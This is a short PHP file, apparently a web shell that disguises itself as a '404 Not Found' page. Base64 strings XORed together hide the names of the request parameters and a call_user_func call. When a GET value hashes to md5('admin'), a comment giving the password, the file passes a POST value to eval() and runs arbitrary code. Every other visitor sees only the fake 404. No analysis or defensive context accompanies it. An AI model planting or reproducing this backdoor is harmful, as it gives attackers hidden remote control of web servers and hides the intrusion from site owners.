
<?php
$a = ${base64_decode("aC57Kw==")^base64_decode("N2k+fw==")}[1];
$b = ${base64_decode("bj0/Izs=")^base64_decode("MW1wcG8=")}[2];
//  1 is md5('admin'). You can have on your own.
if(isset($b) and md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{

	class C{public function __invoke($p) {eval($p);}};
	$t = base64_decode("LzopXWFAJkAtajw+Xl0=")^base64_decode("TFtFMT41VSVfNVpLMD4=");
    @${'t'}(new C(),$b);
  
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>
